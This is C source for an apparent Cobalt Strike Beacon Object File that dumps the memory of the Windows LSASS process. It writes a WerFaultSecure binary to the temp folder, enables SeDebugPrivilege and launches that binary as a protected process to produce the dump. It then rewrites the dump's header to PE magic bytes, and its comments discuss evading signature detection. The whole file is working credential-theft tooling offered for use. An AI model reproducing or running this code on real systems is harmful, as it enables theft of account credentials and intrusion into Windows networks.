#include <windows.h>
#include "WerDump.h"

// Handle pointer in decimal
wchar_t* HandleToDecimal(HANDLE h) {
  // Get Process Heap
  HANDLE hHeap = KERNEL32$GetProcessHeap();
  if (!hHeap) {
      BeaconPrintf(CALLBACK_ERROR, "GetProcessHeap failed: %d\n", KERNEL32$GetLastError());
      return 0;
  }

  size_t bufferSize = 32; // Sufficient for a HANDLE (64bit) in decimal
  wchar_t* buffer = (wchar_t*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, bufferSize * sizeof(wchar_t));
  if (!buffer) {
      return NULL;
  }
  MSVCRT$swprintf_s(buffer, bufferSize, L"%llu", (unsigned long long)h);

end:
  KERNEL32$CloseHandle(hHeap);
  return buffer;
}

// Convert Wchar_t* to char* to output
VOID PrintWchar(wchar_t* wchar_text) {
  // Get Process Heap
  HANDLE hHeap = KERNEL32$GetProcessHeap();
  if (!hHeap) {
      BeaconPrintf(CALLBACK_ERROR, "GetProcessHeap failed: %d\n", KERNEL32$GetLastError());
      return;
  }

  /* Convert the wchar_t* to a char* for printing */
  int multiByteSize = KERNEL32$WideCharToMultiByte(
      CP_UTF8,
      0,
      wchar_text,
      -1,
      NULL,
      0,
      NULL,
      NULL
  );

  if (multiByteSize > 0) {
    char* multiByteCmd = (char*)KERNEL32$HeapAlloc(
      hHeap,
      HEAP_ZERO_MEMORY,
      multiByteSize
    );

    if (multiByteCmd) {
      KERNEL32$WideCharToMultiByte(
        CP_UTF8,
        0,
        wchar_text,
        -1,
        multiByteCmd,
        multiByteSize,
        NULL,
        NULL
      );
      // Now print the converted string
      BeaconPrintf(CALLBACK_OUTPUT, "%s", multiByteCmd);
      KERNEL32$HeapFree(hHeap, 0, multiByteCmd);
    }
  }
end:
  KERNEL32$CloseHandle(hHeap);
}

// Enable Debug privilege
BOOL EnableDebugPrivilege() {
  HANDLE hToken = NULL;
  TOKEN_PRIVILEGES tp;
  LUID luid;
  BOOL bReturnValue = FALSE;

  if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
    BeaconPrintf(CALLBACK_ERROR, "[+] Failed to open process token!\n");
    goto end;
  }
  if (!ADVAPI32$LookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &luid)) {
    BeaconPrintf(CALLBACK_ERROR, "[+] Failed to get privilege value!\n");
    goto end;
  }
  tp.PrivilegeCount = 1;
  tp.Privileges[0].Luid = luid;
  tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
  if (!ADVAPI32$AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
    BeaconPrintf(CALLBACK_ERROR, "[+] Failed to get adjust privilege!\n");
    goto end;
  }
  if (KERNEL32$GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
    BeaconPrintf(CALLBACK_ERROR, "[+] Some error, Check me out!\n");
    goto end;
  }
  BeaconPrintf(CALLBACK_OUTPUT, "[+] Enabled SeDebugPrivilege\n");
  bReturnValue = TRUE;

end:
  if (hToken) {
    KERNEL32$CloseHandle(hToken);
  }
  return bReturnValue;
}

// Get Lsass Process
BOOL EnumProcess(char *pProcessName, DWORD *pdwProcessId) {
  PROCESSENTRY32 pe32;
  pe32.dwSize = sizeof(PROCESSENTRY32);

  HANDLE hSnapshot = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

  if (hSnapshot == INVALID_HANDLE_VALUE) return FALSE;

  if (!KERNEL32$Process32First(hSnapshot, &pe32)) {
    KERNEL32$CloseHandle(hSnapshot);
    return FALSE;
  }

  do {
    if (stricmp(pe32.szExeFile, pProcessName) == 0) {
      *pdwProcessId = pe32.th32ProcessID;
      KERNEL32$CloseHandle(hSnapshot);
      BeaconPrintf(CALLBACK_OUTPUT, "[+] Found lsass process PID: %u\n", *pdwProcessId);
      return TRUE;
    }
  } while (KERNEL32$Process32Next(hSnapshot, &pe32));

  return FALSE;
}

// Get PPL Status
BOOL ProcessGetProtectionLevel(DWORD dwProcessId, PDWORD pdwProtectionLevel)
{
	BOOL bReturnValue = FALSE;
	HANDLE hProcess = NULL;
	PROCESS_PROTECTION_LEVEL_INFORMATION level = { 0 };
	if (!(hProcess = KERNEL32$OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, dwProcessId)))
	{
    BeaconPrintf(CALLBACK_ERROR, "[+] Failed to Open Process to PID: [%d]\n", dwProcessId);
		goto end;
	}
	if (!KERNEL32$GetProcessInformation(hProcess, ProcessProtectionLevelInfo, &level, sizeof(level)))
	{
    BeaconPrintf(CALLBACK_ERROR, "[+] Failed to Get Process Information Of PID: [%d]\n", dwProcessId);
		goto end;
	}
	*pdwProtectionLevel = level.ProtectionLevel;
	bReturnValue = TRUE;

end:
	if (hProcess)
		KERNEL32$CloseHandle(hProcess);

	return bReturnValue;
}

// Write WerFaultSecure to disk
// This is a the default approach, while it leaves an IOC, and potentially can get you detected,
// there are other ways you can use to run the PE in memory, however it wouldn't be effective as it requires it to be in disk anyways for signature verification and thus effecting the protection status.
// so its a risk you're willing to take.
// you can however manipulate the binary itself, to avoid signature detection, and try to make it legit as possible.
// there's much better approaches that what i wrote in WriteWer, this is only a poc, imagine modify it and explorrre.
BOOL WriteWer(BYTE Bin[], INT size, wchar_t*  werPath) {
  wchar_t path[MAX_PATH];
  if (KERNEL32$GetTempPathW(MAX_PATH, path) == 0) {
    BeaconPrintf(CALLBACK_ERROR, "[+] GetTempPAthA failed to get temp path: Error [%d]\n", KERNEL32$GetLastError());
    return FALSE;
  }
  MSVCRT$srand((unsigned int)MSVCRT$time(NULL)); // Seed the random number generator
  wchar_t filename[MAX_PATH];
  MSVCRT$swprintf_s(filename, MAX_PATH, L"%s\%08X.exe", path, MSVCRT$rand());

  BeaconPrintf(CALLBACK_OUTPUT, "[+] Writing executable to file: ");
  PrintWchar(filename);
  BeaconPrintf(CALLBACK_OUTPUT, "\n");

  /* CreateFileW */
  HANDLE hFile = KERNEL32$CreateFileW(filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
  if (hFile == INVALID_HANDLE_VALUE) {
    BeaconPrintf(CALLBACK_ERROR, "[!] CreateFileW failed: %d\n", KERNEL32$GetLastError());
    return FALSE;
  }

  // Write the data to the file
  DWORD bytesWritten;
  BOOL result = KERNEL32$WriteFile(hFile, Bin, size - 1, &bytesWritten, NULL);
  BeaconPrintf(CALLBACK_OUTPUT, "[+] Sucessfully Wrote to file");
  MSVCRT$wcscpy_s( werPath, MAX_PATH, filename);

end:
  KERNEL32$CloseHandle(hFile);
  return result && (bytesWritten == size - 1); // return TRUE
}

// Create Process as PPL
BOOL CreatePLLProcess(DWORD Plevel, wchar_t* Path) {
  SIZE_T size = 0;

  STARTUPINFOEXW siex = { 0 };
  siex.StartupInfo.cb = sizeof(siex);
  PROCESS_INFORMATION pi = { 0 };
  LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList = NULL;
  HANDLE hProcess, hThread;
  DWORD dwProtectionLevel, Result, Exitcode;


  if (!KERNEL32$InitializeProcThreadAttributeList(NULL, 1, 0, &size) && KERNEL32$GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
    BeaconPrintf(CALLBACK_ERROR, "[+] Failed to Initialize Attribute List: Error [%d]\n", KERNEL32$GetLastError());
    return FALSE;
  }

  // Get Process Heap
  HANDLE hHeap = KERNEL32$GetProcessHeap();
  if (!hHeap) {
      BeaconPrintf(CALLBACK_ERROR, "GetProcessHeap failed: %d\n", KERNEL32$GetLastError());
      return FALSE;
  }

  lpAttributeList = KERNEL32$HeapAlloc(hHeap, 0, size);
  if (!lpAttributeList) {
    BeaconPrintf(CALLBACK_ERROR, "[+] Failed to Allocate Memory for Attribute List: Error [%d]\n", KERNEL32$GetLastError());
    return FALSE;
  }

  if (!KERNEL32$InitializeProcThreadAttributeList(lpAttributeList, 1, 0, &size)) {
    BeaconPrintf(CALLBACK_ERROR, "[+] Failed to Initialize Attribute List: Error [%d]\n", KERNEL32$GetLastError());
    KERNEL32$HeapFree(hHeap, 0, lpAttributeList);
    return FALSE;
  }

  if (!KERNEL32$UpdateProcThreadAttribute(lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL, &Plevel, sizeof(Plevel
), NULL, NULL)) {
    BeaconPrintf(CALLBACK_ERROR, "[+] Failed to Update Attribute List: Error [%d]\n", KERNEL32$GetLastError());
    KERNEL32$DeleteProcThreadAttributeList(lpAttributeList);
    KERNEL32$HeapFree(hHeap, 0, lpAttributeList);
    return FALSE;
  }

  siex.lpAttributeList = lpAttributeList;

  // Create Process
  if (!KERNEL32$CreateProcessW(NULL, (LPWSTR)Path, NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS, NULL, NULL, &siex.StartupInfo, &pi)) {
    BeaconPrintf(CALLBACK_ERROR, "[+] Failed to CreateProcessW: Error [%d]\n", KERNEL32$GetLastError());
    KERNEL32$DeleteProcThreadAttributeList(lpAttributeList);
    KERNEL32$HeapFree(hHeap, 0, lpAttributeList);
    return FALSE;
  }


  // Free
  KERNEL32$DeleteProcThreadAttributeList(lpAttributeList);
  KERNEL32$HeapFree(hHeap, 0, lpAttributeList);

  hProcess = pi.hProcess;
  hThread = pi.hThread;

  if (!ProcessGetProtectionLevel(pi.dwProcessId, &dwProtectionLevel)) {
    BeaconPrintf(CALLBACK_ERROR, "[+] Something went wrong, when getting protection level\n");
    return FALSE;
  }

  BeaconPrintf(CALLBACK_OUTPUT, "[+] SUCCESS! Created PPL Process With Pid: [%d], Protection Level [%d]\n", pi.dwProcessId, dwProtectionLevel);

  Result = KERNEL32$WaitForSingleObject(hProcess, INFINITE);
  if (Result == WAIT_OBJECT_0) {
    KERNEL32$GetExitCodeProcess(hProcess, &Exitcode);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] PPL Process exit with code: [%d]\n", Exitcode);
  }

  BeaconPrintf(CALLBACK_OUTPUT, "[+] Created Process Result code: [%d]\n", Result);
  return TRUE;
}

DWORD GetMainThreadId(DWORD pid) {

    PVOID buffer = NULL;
    ULONG bufferSize = 64 * 1024; // 64KB
    NTSTATUS STATUS;
    const ULONG MAX_BUFFER_SIZE = 16 * 1024 * 1024; //16MB limit
    DWORD mainThreadId = 0;

    // Get Process Heap
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    if (!hHeap) {
        BeaconPrintf(CALLBACK_ERROR, "GetProcessHeap failed: %d\n", KERNEL32$GetLastError());
        return 0;
    }

    do {
        // Allocate memory using HeapAlloc
        buffer = KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, bufferSize);
        if (!buffer) {
            BeaconPrintf(CALLBACK_ERROR, "HeapAlloc failed: %d\n", KERNEL32$GetLastError());
            return 0;
        }

        // Query system information
        STATUS = NTDLL$NtQuerySystemInformation(SystemProcessInformation, buffer, bufferSize, NULL);
        if (STATUS == 0xC0000004) { // STATUS_INFO_LENGTH_MISMATCH
            KERNEL32$HeapFree(hHeap, 0, buffer);
            bufferSize *= 2;

            // Prevent runaway buffer size
            if (bufferSize > MAX_BUFFER_SIZE) {
                BeaconPrintf(CALLBACK_ERROR, "Buffer size exceeded maximum limit (%u bytes)\n", MAX_BUFFER_SIZE);
                return 0;
            }
        } else if (STATUS != 0) { // Other errors
            KERNEL32$HeapFree(hHeap, 0, buffer);
            BeaconPrintf(CALLBACK_ERROR, "NtQuerySystemInformation failed: 0x%08X\n", STATUS);
            return 0;
        }
    } while (STATUS == 0xC0000004);

    // Process the SYSTEM_PROCESS_INFORMATION structure to find the main thread
    PSYSTEM_PROCESS_INFORMATION procInfo = (PSYSTEM_PROCESS_INFORMATION)buffer;
    while (procInfo->NextEntryOffset || procInfo->UniqueProcessId) {
        if ((DWORD)(ULONG_PTR)procInfo->UniqueProcessId == pid) {
            // Found the process, get the first thread (often the main thread)
            if (procInfo->NumberOfThreads > 0) {
                mainThreadId = (DWORD)(ULONG_PTR)procInfo->Threads[0].ClientId.UniqueThread;
                break;
            }
        }
        if (!procInfo->NextEntryOffset) break;
        procInfo = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)procInfo + procInfo->NextEntryOffset);
    }

    if (mainThreadId == 0) {
        BeaconPrintf(CALLBACK_ERROR, "Main thread not found for PID %u\n", pid);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "Main thread ID for PID %u: %u\n", pid, mainThreadId);
    }

    // Clean up
    KERNEL32$HeapFree(hHeap, 0, buffer);
    return mainThreadId;
}

// Create Thread to independently run ResumeProcess
/* BOOL ResumeProcessThread(DWORD dwProcessId) { */
/*   /\* HANDLE threadId = KERNEL32$CreateThread(NULL, 0, ResumeProcess, hProcessId, DWORD dwCreationFlags, LPDWORD lpThreadId) *\/ */
/*   DWORD dwThreadId; */
/*   HANDLE hThreadId = KERNEL32$CreateThread(NULL, 0, ResumeProcess, &dwProcessId, 0, &dwThreadId); */
/*   if (!hThreadId) { */
/*     BeaconPrintf(CALLBACK_ERROR, "[!] CreateThread failed: %d\n", KERNEL32$GetLastError()); */
/*     return FALSE; */
/*   } */
/*   KERNEL32$CloseHandle(hThreadId); */
/*   return TRUE; */
/* } */

DWORD WerDump(DWORD dwProcessTid, DWORD dwProcessId, wchar_t werPath[MAX_PATH]) {
  DWORD dwProtectionLevel = 0;

  /* if (!ProcessGetProtectionLevel(dwProcessId, &dwProtectionLevel)) { */
  /*   BeaconPrintf(CALLBACK_ERROR, "[+] Something went wrong, when getting protection level\n"); */
  /*   return; */
  /* } */

  /* BeaconPrintf(CALLBACK_OUTPUT, "[+] Protection Code: 0x%lx\n", dwProtectionLevel); */

  SECURITY_ATTRIBUTES sa = {};
  sa.nLength = sizeof(sa);
  sa.bInheritHandle = TRUE;
  sa.lpSecurityDescriptor = NULL;

  // Generate a random filename
  wchar_t path[MAX_PATH];
  if (KERNEL32$GetTempPathW(MAX_PATH, path) == 0) {
    BeaconPrintf(CALLBACK_ERROR, "[+] GetTempPAthA failed to get temp path: Error [%d]\n", KERNEL32$GetLastError());
    return FALSE;
  }
  MSVCRT$srand((unsigned int)MSVCRT$time(NULL)); // Seed the random number generator
  wchar_t werDump[MAX_PATH], werDumpEnc[MAX_PATH];
  MSVCRT$swprintf_s(werDump, MAX_PATH, L"%s\%08X.dll", path, MSVCRT$rand());
  MSVCRT$swprintf_s(werDumpEnc, MAX_PATH, L"%s\%08X.dll", path, MSVCRT$rand());

  HANDLE hDump = KERNEL32$CreateFileW(werDump, GENERIC_WRITE, 0, &sa, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
  HANDLE hEncDump = KERNEL32$CreateFileW(werDumpEnc, GENERIC_WRITE, 0, &sa, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
  if (hDump == INVALID_HANDLE_VALUE || hEncDump == INVALID_HANDLE_VALUE)
  {
    BeaconPrintf(CALLBACK_ERROR, "[!] CreateFileW failed: %d\n", KERNEL32$GetLastError());
  }

  HANDLE hCancel = KERNEL32$CreateEventW(&sa, TRUE, FALSE, NULL);
  if (!hCancel)
  {
    BeaconPrintf(CALLBACK_ERROR, "[!] CreateEventW failed: %d\n", KERNEL32$GetLastError());
    KERNEL32$CloseHandle(hDump);
    KERNEL32$CloseHandle(hEncDump);
    return 1;
  }

  size_t cmdSize = 1024; // Adjust based on expected length
  HANDLE hHeap = KERNEL32$GetProcessHeap();
  if (!hHeap) {
    BeaconPrintf(CALLBACK_ERROR, "[!] GetProcessHeap failed: %d\n", KERNEL32$GetLastError());
    return 1;
  }

  wchar_t* commandLine = (wchar_t*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, cmdSize * sizeof(wchar_t));
  if (!commandLine) {
      return 1; // Handle allocation failure
  }

  // Convert handles to decimal strings
  wchar_t* hDumpStr = HandleToDecimal(hDump);
  wchar_t* hEncDumpStr = HandleToDecimal(hEncDump);
  wchar_t* hCancelStr = HandleToDecimal(hCancel);

  if (!hDumpStr || !hEncDumpStr || !hCancelStr) {
      BeaconPrintf(CALLBACK_ERROR, "[!] Failed to convert to handle decimal\n");
      goto end;
      return 1; // Handle allocation failure
  }

  // Build the command line using swprintf
  int result = MSVCRT$swprintf_s(
      commandLine,
      cmdSize,
      L"\"%s\" /h /pid %d /tid %d /file %s /encfile %s /cancel %s /type 268310",
      werPath,
      dwProcessId,
      dwProcessTid,
      hDumpStr,
      hEncDumpStr,
      hCancelStr
  );
  if (result < 0) {
      BeaconPrintf(CALLBACK_ERROR, "[!] swprintf_s failed\n");
      goto end;
  }

  /* PrintWchar(commandLine); */
  /* goto end; */

  /* ResumeProcessThread(dwProcessId); */
  BOOL status = CreatePLLProcess(dwProtectionLevel, commandLine);
  if (!status) {
    BeaconPrintf(CALLBACK_ERROR, "[!] Cannot Create PPL process :(\n");
    goto end;
  }

  // {0x4D, 0x44, 0x4D, 0x50} // Mini dump header
  BYTE data[4] = {0x4D, 0x5A, 0x90, 0x00}; // PE magic header
  DWORD bytesW;
  KERNEL32$SetFilePointer(hDump, 0, NULL, FILE_BEGIN);

  if (!KERNEL32$WriteFile(hDump, data, sizeof(data), &bytesW, NULL)) {
    BeaconPrintf(CALLBACK_ERROR, "[!] WriteFile failed: %d\n", KERNEL32$GetLastError());
    goto end;
  }

  BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully Dumped Lsass, Find the dump in the following path");
  PrintWchar(werDump);
  BeaconPrintf(CALLBACK_OUTPUT, "\n");


end:
  // Clean up
  KERNEL32$HeapFree(hHeap, 0, commandLine);
  KERNEL32$HeapFree(hHeap, 0, hDumpStr);
  KERNEL32$HeapFree(hHeap, 0, hEncDumpStr);
  KERNEL32$HeapFree(hHeap, 0, hCancelStr);
  KERNEL32$CloseHandle(hDump);
  KERNEL32$CloseHandle(hEncDump);
  KERNEL32$CloseHandle(hCancel);
  /* KERNEL32$DeleteFileW(werDump); */
  KERNEL32$DeleteFileW(werDumpEnc);
  KERNEL32$DeleteFileW(werPath);
  return 0;
}


#ifdef BOF

void go(IN PCHAR args, IN ULONG argc) {
  datap parser = {0};
  BeaconDataParse(&parser, args ,argc);
  // Extract Exe
  INT binLength = 0;
  unsigned char* ExeBin = BeaconDataExtract(&parser, &binLength);
  /* BeaconPrintf(CALLBACK_OUTPUT, "[+] Binary Length WerFaultSecure executable %d\n", binLength); */
  wchar_t werPath[MAX_PATH];
  if (!WriteWer(ExeBin, binLength, werPath)) {
    BeaconPrintf(CALLBACK_ERROR, "[+] Failed to write WerFaultSecure executable\n");
  }
  /* DWORD dwProcessTid = GetMainThreadId(KERNEL32$GetProcessId(KERNEL32$GetCurrentProcess())); */
  // Check first if we can enable the privilege.
  if (!EnableDebugPrivilege()) {
      BeaconPrintf(CALLBACK_ERROR, "[+] Failed to enable SeDebugPrivilege\n");
      return;
  }
  DWORD dwProcessId;
  if (!EnumProcess("lsass.exe", &dwProcessId)) return;
  DWORD dwProcessTid = GetMainThreadId(dwProcessId);
  if (WerDump(dwProcessTid, dwProcessId, werPath) != 0) {
    BeaconPrintf(CALLBACK_ERROR, "[+] Failed to dump\n");
  }
  return;
}

#else

int main() {
  /* GetMainThreadId(KERNEL32$GetProcessId((HANDLE)(LONG_PTR) -1)); */
  return 0;
}

#endif
